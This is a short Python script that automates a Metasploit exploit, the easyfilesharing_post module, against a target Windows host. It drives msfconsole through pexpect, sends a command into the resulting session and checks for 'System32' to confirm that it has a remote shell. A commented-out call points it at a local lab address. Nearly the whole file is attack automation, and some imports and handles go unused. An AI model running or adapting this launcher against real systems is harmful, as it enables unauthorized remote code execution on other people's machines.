from datetime import datetime
import subprocess
import re
import sys
import pandas as pd
from tabulate import tabulate
import os
import pexpect

import SSHClient

from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole


def convertStrToBytes(string):
    mystr = str.encode(string)
    return mystr

def executeEasyFileSharing(target):
    print("Executing: "+"msfconsole -q -x 'use exploit/windows/http/easyfilesharing_post ;set rhosts "+target[1]+";run")
    print("About to metasploit")
    #Create logfile
    fout = open('mylog.txt', 'wb')

    child = pexpect.spawnu("msfconsole -q -x "+ str('"use exploit/windows/http/easyfilesharing_post ;set rhosts '+target[1] +';run"'), encoding='utf-8')
    child.logfile = sys.stdout
    child.sendline("pwd")
    #print(child.expect(["Meterpreter session"], timeout=300))
    if child.expect(["System32"],timeout=50) == 0:
        print("Success")
        return child
    else:
        print("Failed")
        return False
    
#executeEasyFileSharing(["buffer","192.168.1.86"])
